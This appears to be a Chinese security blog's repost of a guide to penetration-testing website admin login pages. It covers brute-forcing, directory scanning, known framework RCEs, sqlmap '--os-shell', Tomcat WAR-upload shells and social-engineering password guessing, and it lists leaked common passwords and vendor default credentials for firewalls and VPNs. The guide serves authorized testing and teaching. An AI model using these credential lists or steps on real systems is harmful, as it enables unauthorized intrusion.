<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>ALL BLUE</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="ALL BLUE">
<meta property="og:url" content="http://allblue147.github.io/index.html">
<meta property="og:site_name" content="ALL BLUE">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ALL BLUE">
  
    <link rel="alternative" href="/atom.xml" title="ALL BLUE" type="application/atom+xml">
  
  
    <link rel="icon" href="/http://oayoilchh.bkt.clouddn.com/2016/07/27/18:05:26%20">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
        <a href="/" class="profilepic">
            
            <img lazy-src="img/head.jpg" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">JYP</a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="http://bestwing.me">博客首页</a></li>
                        
                            <li><a href="/archives">文章归档</a></li>
                        
                            <li><a href="/CTFStudy">学习导航</a></li>
                        
                            <li><a href="/PWNABLE">PWNABLE</a></li>
                        
                            <li><a href="/resume">个人简历</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
                            
                                <a class="fl github" target="_blank" href="https://github.com/WinMin" title="github">github</a>
                            
                                <a class="fl zhihu" target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
                            
                                <a class="fl weibo" target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
                            
                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://ring3.xyz/">Yllen</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://mxny.org/">麦香浓郁</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/">K0sh1</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/">信鑫</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://bystudent.com/">ByStundet表哥</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/">汪神_Jarvis</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://sh3ll.me/">Chu</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy">L3m0n</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/">muhe</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/">_画船听雨</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html">Virink</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/">国光</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/">老锥</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cizel.cn/">C1zel</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://1phan.cc">1phan</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.liuil.top/">liuil</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://burnegg.com/">burnegg</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://jwrsec.cn/">jwr-sec</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://sudalover.cn/">苏打</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.binklac.com">VeroFess</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.bendawang.site/">bendawang</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/">hook</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.flier.net.cn/">Flier&#39;blog</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.mutepig.club">mutepig</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.iret.xyz/list.aspx">Silver</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://simp1e.leanote.com/">Simple</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://processor.pub/">Processor</a>
                    
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">一只淹死在二进制海洋里的二进制狗</div>
                </section>
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">JYP</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/head.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">JYP</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="http://bestwing.me">博客首页</a></li>
                
                    <li><a href="/archives">文章归档</a></li>
                
                    <li><a href="/CTFStudy">学习导航</a></li>
                
                    <li><a href="/PWNABLE">PWNABLE</a></li>
                
                    <li><a href="/resume">个人简历</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/WinMin" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
                    
                        <a class="weibo" target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-精品文章/谈谈对后台登陆页面的渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/精品文章/谈谈对后台登陆页面的渗透测试/" class="article-date">
      <time datetime="2019-12-06T17:03:10.575Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/精品文章/谈谈对后台登陆页面的渗透测试/">谈谈对后台登录页面的渗透测试</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>本来是想写漏洞文章的，但是看见这篇文章，觉得这篇文章对渗透经验少的人可能会有点帮助，是可以让新手有所收获的文章，所以放上博客</p>
<h2 id="原文：谈谈对后台登录页面的渗透测试"><a href="#原文：谈谈对后台登录页面的渗透测试" class="headerlink" title="原文：谈谈对后台登录页面的渗透测试"></a>原文：<a href="https://www.anquanke.com/post/id/185426" target="_blank" rel="noopener">谈谈对后台登录页面的渗透测试</a></h2><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有些朋友在渗透时扫描到后台登陆界面，却不知道如何入手。最近刚好在某公司做渗透实习，对目标固定的系统渗透有些体会。因此这里讲一下对网站后台登陆界面的渗透思路，希望能为大家提供一些帮助。</p>
<h2 id="0x01-开始"><a href="#0x01-开始" class="headerlink" title="0x01 开始"></a>0x01 开始</h2><p>本人在进入登陆界面时，一般都是先用万能密码什么的测下输入框有没有注入（现在很少见了）。如果没有，那就先拿admin，123456什么的测试下弱口令，不求运气爆棚一下就猜到密码。主要是看下回显，查看是否存在账号锁定策略，密码不正确，不存在此用户名等信息，以便于尝试遍历可能存在的用户名。没验证码就上爆破工具，有验证码的话看看能不能绕过,实在不行手工测几个账号密码碰碰运气。</p>
<h2 id="0x02-爆破"><a href="#0x02-爆破" class="headerlink" title="0x02 爆破"></a>0x02 爆破</h2><p>如果没验证码阻碍，那爆破没什么好说的，拿个好字典，直接干就是了。</p>
<p>不过注意下有时密码传输会使用md5或者base64之类的加密，这时除了自己写脚本外，可以使用burpsuite的intruder模块<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6thmeqhnfj30v10l2tap.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6thmw22wqj30uk0bxdgp.jpg" alt><br>爆破的传统思路都是固定账号爆破密码，还有一种姿势是固定密码爆破用户名。比如使用固定密码123456，爆破常用用户名或者常用人名拼音。</p>
<h2 id="0x03-扫目录"><a href="#0x03-扫目录" class="headerlink" title="0x03 扫目录"></a>0x03 扫目录</h2><p>目录扫描也是一个存在惊喜的地方，说不定能扫描到后台未授权访问的链接、备份文件、编辑器、敏感信息等。</p>
<p>像后台登陆的网址看多了，常规的路径像<a href="http://www.xxx.com/admin/login.aspx(.php)" target="_blank" rel="noopener">www.xxx.com/admin/login.aspx(.php)</a></p>
<p>老司机甚至不用御剑什么的工具跑，就能直接猜到。</p>
<p>一般碰到下面这种情况，可采用fuzz大法。一层一层fuzz，尝试寻找可利用的信息。漏洞银行有一期衬衫的视频fuzz讲得很好。他用的工具是wfuzz，感觉不错，感兴趣的可以去看看。<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6thndmouej30up0ekgnf.jpg" alt><br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thno21asj30tt0f1abo.jpg" alt></p>
<p><strong>这里给大家讲一下我做授权渗透的一个案列:</strong></p>
<p>一般给客户的后台系统做渗透，客户都会给个测试账号，除了测登陆界面外，还测下后台的功能模块。但这次当我问客户要账号密码时，客户回：你们不是要模拟黑客做渗透测试吗，那就自己打进去啊。( ╯□╰ )好吧，作为实习生的我也只能硬着头皮刚登陆界面了。</p>
<p>先看了下链接，发现是Java站，且链接是.do结尾，但struct2工具试了下没成功。<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tho3of7mj30uj08bgmz.jpg" alt><br>看了下登陆界面，有验证码，网站看去的版本也挺新的，感觉不太好搞。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thoghp6aj30if096t9c.jpg" alt><br>测下注入无果，于是抓包看下验证码是否可以绕过或者不变，结果这个验证码很称职，爆破不了。验证码辨认还算清楚，不过验证码识别，总觉得不太靠谱。。。等绝望了找不到洞再试吧。于是去扫了下目录。诶，发现有好东西。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thovfgsjj30au087767.jpg" alt><br>首先扫到了一个services服务路径<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thpfty87j30u10d276h.jpg" alt><br>知道了Apache Axis组件的版本信息<br><img src="https://imgchr.com/i/ntKnXQ" alt><br>然后马上想到这个组件当时刚爆出一个RCE漏洞</p>
<p>poc链接：<a href="https://github.com/KibodWapon/Axis-1.4-RCE-Poc" target="_blank" rel="noopener">https://github.com/KibodWapon/Axis-1.4-RCE-Poc</a></p>
<p>结果试了下没成功。然后再尝试了四月份CNVD看到的RCE漏洞也无果。</p>
<p>还扫出了一个ckfinder编辑器<br><a href="http://xxx.xxx.com/ckfinder/ckfinder.html" target="_blank" rel="noopener">http://xxx.xxx.com/ckfinder/ckfinder.html</a></p>
<p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti4gao3lj30ty0cqwg5.jpg" alt><br>一看，我滴乖乖，难道已经有黑客搞进去了？</p>
<p>赶紧网上找了下这个版本有存在什么漏洞，并尝试文件上传绕过。但很遗憾，这个网站并不存在解析漏洞，利用不了，文件上传也没绕过。不过令人庆幸的是，黑客应该也没有利用成功。</p>
<p>。。。</p>
<p>又挖了一段时间，同事竟然说他拿shell了！</p>
<p>what?<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti4wgekgj308g083jtx.jpg" alt><br>发现他扫目录扫到了<a href="http://xxx.xx.com/manager/html" target="_blank" rel="noopener">http://xxx.xx.com/manager/html</a><br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti62iseaj30sw09l421.jpg" alt><br>然后一个admin/123456弱口令进入tomcat后台，然后传war包成功拿到shell<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6ti6h08nrj30pi07bt97.jpg" alt><br>看了这波操作久久无语，看来我的字典太差，tomcat目录都没扫出来。还有弱口令漏洞，真的很无敌。</p>
<h2 id="0x04-框架漏洞"><a href="#0x04-框架漏洞" class="headerlink" title="0x04 框架漏洞"></a>0x04 框架漏洞</h2><p>对一些CMS，已经比较成熟了，漏洞确实不好挖。如果网上（乌云，seebug，搜索引擎等）的历史漏洞没有复现成功，那一般情况下就只能寻找下逻辑漏洞、网站管理员配置错误或者弱口令什么的。</p>
<p>对于一些不知名的框架，一般也可通过登陆界面底下的声明中找到开发公司和产品版本时间。</p>
<p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti7a4kvuj30g901sjrn.jpg" alt></p>
<p>在网上找找此公司产品是否爆出过漏洞。若是开源的框架，还可下载源码进行代码审计寻找漏洞。</p>
<p>像java的站，登陆页面是.do或.action的网址。可尝试下 struts2 命令执行漏洞，本人一般使用安恒的S2漏洞验证工具。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6ti7r0kimj30vk0o4ak5.jpg" alt><br>又如thinkphp的CMS，可尝试下是否存在相应版本的命令执行漏洞。本人曾在邮储银行的一个系统登陆界面挖到tp5命令执行漏洞拿到shell，补天评了1700元。</p>
<p>emmmm,当然厂商说漏洞无影响给拒了就是另一回事了……<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti83uxffj307y05ojsk.jpg" alt></p>
<h2 id="0x05-弱口令"><a href="#0x05-弱口令" class="headerlink" title="0x05 弱口令"></a>0x05 弱口令</h2><p>可能有些小伙伴对弱口令嗤之以鼻，觉得它没有技术含量，但其实不然，结合社工，它的作用和危害可能比其他漏洞更大，希望大家重视。</p>
<p>刚巧最近有去公安厅复测6月HW的漏洞，检测漏洞是否修复。几十份报告，原以为要花很长时间，但结果却是：差不多半小时就完成了，且部分时间是花在输入网址上（报告不给拷到自己电脑上，只能看着公安厅电脑的报告手打网址）。</p>
<p>耗时少的其中一个原因是漏洞有八、九层的漏洞都是弱口令，其中大部分漏洞还都是部委级别的系统，所以测的很快。虽然hw期间比较特殊，还是比例这么大还是挺能说明问题的。</p>
<p><strong>以下是某大佬对14年底12306泄露密码的统计分析</strong></p>
<p>哈哈，可以发现我国还是对数字情有独钟，国外的top100弱口令还是不适合我大天朝的国情。很少有password,football之类的英文密码。</p>
<p>密码中包含有 123456 数字的，出现 3236 次<br>密码中包含有 123 数字的，出现 11213 次<br>密码中包含有 520 数字的，出现 4549 次<br>密码中包含有 1314 数字的，出现 3113 次<br>密码中包含有 aini 的，出现 877 次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">次数 密码</span><br><span class="line">392 123456</span><br><span class="line">281 a123456</span><br><span class="line">165 123456a</span><br><span class="line">161 5201314</span><br><span class="line">157 111111</span><br><span class="line">136 woaini1314</span><br><span class="line"> 98 qq123456</span><br><span class="line"> 98 123123</span><br><span class="line"> 97 000000</span><br><span class="line"> 93 1qaz2wsx</span><br><span class="line"> 83 1q2w3e4r</span><br><span class="line"> 80 qwe123</span><br><span class="line"> 76 7758521</span><br><span class="line"> 68 123qwe</span><br><span class="line"> 63 a123123</span><br><span class="line"> 56 woaini520</span><br><span class="line"> 55 123456aa</span><br><span class="line"> 52 1314520</span><br><span class="line"> 52 100200</span><br><span class="line"> 51 woaini</span><br><span class="line"> 50 woaini123</span><br><span class="line"> 50 123321</span><br><span class="line"> 49 q123456</span><br><span class="line"> 49 123456789</span><br><span class="line"> 48 asd123</span><br><span class="line"> 48 a123456789</span><br><span class="line"> 48 5211314</span><br><span class="line"> 48 123456789a</span><br><span class="line"> 47 z123456</span><br><span class="line"> 47 asd123456</span><br><span class="line"> 45 a5201314</span><br><span class="line"> 42 zhang123</span><br><span class="line"> 41 aa123456</span><br><span class="line"> 40 123123a</span><br><span class="line"> 38 aptx4869</span><br><span class="line"> 37 1qazxsw2</span><br><span class="line"> 37 1q2w3e4r5t</span><br><span class="line"> 36 5201314a</span><br><span class="line"> 35 aini1314</span><br><span class="line"> 35 1q2w3e</span><br><span class="line"> 34 woaini521</span><br><span class="line"> 34 q1w2e3r4</span><br><span class="line"> 34 31415926</span><br><span class="line"> 34 123456qq</span><br><span class="line"> 33 a111111</span><br><span class="line"> 33 520520</span><br><span class="line"> 33 1234qwer</span><br><span class="line"> 29 123456abc</span><br><span class="line"> 29 111111a</span><br><span class="line"> 29 110110</span><br><span class="line"> 28 w123456</span><br><span class="line"> 28 abc123</span><br><span class="line"> 28 7758258</span><br><span class="line"> 26 iloveyou</span><br><span class="line"> 26 159753</span><br><span class="line"> 25 qwer1234</span><br><span class="line"> 25 a000000</span><br><span class="line"> 24 zxc123</span><br><span class="line"> 24 123qweasd</span><br><span class="line"> 24 123654</span><br><span class="line"> 23 qq123123</span><br><span class="line"> 23 abc123456</span><br><span class="line"> 23 123456q</span><br><span class="line"> 22 qq5201314</span><br><span class="line"> 22 12345678</span><br><span class="line"> 21 456852</span><br><span class="line"> 21 000000a</span><br><span class="line"> 20 1314521</span><br><span class="line"> 19 zxc123456</span><br><span class="line"> 19 asdasd</span><br><span class="line"> 19 as123456</span><br><span class="line"> 19 666666</span><br><span class="line"> 19 521521</span><br><span class="line"> 19 112233</span><br><span class="line"> 18 q1w2e3</span><br><span class="line"> 18 abcd1234</span><br><span class="line"> 18 aaa123</span><br><span class="line"> 17 qazwsx123</span><br><span class="line"> 17 qaz123</span><br><span class="line"> 17 aaaaaa</span><br><span class="line"> 17 a123321</span><br><span class="line"> 17 12qwaszx</span><br><span class="line"> 17 123000</span><br><span class="line"> 17 11111111</span><br><span class="line"> 16 zxcvbnm123</span><br><span class="line"> 16 wang123</span><br><span class="line"> 16 s123456</span><br><span class="line"> 16 nihao123</span><br><span class="line"> 16 love1314</span><br><span class="line"> 16 caonima123</span><br><span class="line"> 16 asdasd123</span><br><span class="line"> 16 753951</span><br><span class="line"> 16 5845201314</span><br><span class="line"> 16 584520</span><br><span class="line"> 16 159357</span><br><span class="line"> 16 147258</span><br><span class="line"> 16 1123581321</span><br><span class="line"> 16 110120</span><br><span class="line"> 15 hao123</span><br><span class="line"> 15 a7758521</span><br></pre></td></tr></table></figure></p>
<p><strong>遇到网络设备，基本像交换机、路由器、安全设备之类的，可以尝试一下默认密码</strong></p>
<p>网上找到的，但忘了是哪个大佬发的了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119</span><br><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）</span><br><span class="line">登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</span><br><span class="line">深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251</span><br><span class="line">https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430</span><br><span class="line">启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766</span><br><span class="line">https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</span><br><span class="line">juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen</span><br><span class="line">Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco</span><br><span class="line">Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123</span><br><span class="line">H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430</span><br><span class="line">绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效</span><br><span class="line">网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220</span><br><span class="line">深信服VPN： 51111端口 delanrecover</span><br><span class="line">华为VPN：账号：root 密码：mduadmin</span><br><span class="line">华为防火墙： admin Admin@123 eudemon</span><br><span class="line">eudemon Juniper防火墙： netscreen netscreen</span><br><span class="line">迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</span><br><span class="line">山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</span><br><span class="line">安恒的明御防火墙 admin/adminadmin</span><br><span class="line">某堡垒机 shterm/shterm</span><br><span class="line">天融信的vpn test/123456</span><br></pre></td></tr></table></figure></p>
<h2 id="0x06-社工"><a href="#0x06-社工" class="headerlink" title="0x06 社工"></a>0x06 社工</h2><p>在我看来社工是很牛逼的一种攻击方式，有时可以四两拨千斤。</p>
<p>像教育站，登陆账号可能是学号，密码是身份证后六位。百度查xxx学校一卡通丢失，一般就能从某学生的失物启示找到学号。</p>
<p>或者在文章标题下，若存在作者名字，可能就是用户名<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti8jhd44j30r403mwg4.jpg" alt><br>密码除结合管理员电话，qq，姓名等外，还可注意下网站的一些关键词。曾挖过一个弱口令漏洞，密码是网站域名+123，都不用生成字典就进后台了。</p>
<p>最近刚好参加某省护网，讲个例子：对某系统爆破admin用户的密码没成功，于是在联系我们处找到了管理员的一些信息，想生成社工字典试下运气。</p>
<p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti8y4ebkj30rc0dhdg0.jpg" alt></p>
<p>本想直接用社工密码生成工具生成字典爆破一下的，但突然想到注册处可以遍历用户名是否存在</p>
<p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti9fkjngj315a0ao406.jpg" alt></p>
<p>于是结合社工尝试几个账号，发现联系我们处的管理员的账号是姓氏首字母加名字全拼，然后一爆破，密码123456直接进去后台。并在后台的搜索处发现Sql注入，再用sqlmap神器的命令 —os-shell成功打开xpcmdshell，拿到系统权限。</p>
<p>社工密码字典生成,怕麻烦的可使用在线网站生成：<a href="http://tools.mayter.cn/" target="_blank" rel="noopener">http://tools.mayter.cn/</a><br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiarmsq2j30tw0h5my0.jpg" alt></p>
<p>也可使用cupp这款工具，这是一款交互式的工具，使用比较简单</p>
<p>地址：<a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></p>
<p><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6tibbbjjoj30tp0eogvv.jpg" alt></p>
<p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tibo6uqfj30ug04m42p.jpg" alt></p>
<p>看看生成的密码：<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tic28hgzj30nk0ekn58.jpg" alt></p>
